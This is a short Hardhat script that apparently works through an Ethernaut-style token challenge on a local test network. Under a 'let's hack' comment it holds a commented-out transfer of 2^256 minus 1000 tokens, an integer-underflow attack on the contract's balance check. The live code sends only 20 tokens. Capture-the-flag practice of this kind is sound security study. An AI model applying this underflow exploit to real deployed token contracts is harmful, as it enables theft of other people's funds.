const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  console.log("Deployer : ", owner.address);

  const Token = await ethers.getContractFactory("Token");
  const token = await Token.deploy(1000000000000000);
  await token.deployed();
  const bool = await token.transfer(addr1.address, 20);
  console.log(await token.totalSupply());

  const hacker = await token.connect(addr1);

  console.log("balace of hacker : ", await token.balanceOf(addr1.address));

  // ------------ let's hack -------------

  //   await hacker.transfer(
  //     owner.address,
  //     ethers.BigNumber.from(`2`).pow(256).sub(`1000`)
  //   );
  await hacker.transfer(owner.address, "20");
  console.log("balace of hacker : ", await token.balanceOf(addr1.address));
  console.log("balace of owner : ", await token.balanceOf(owner.address));
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
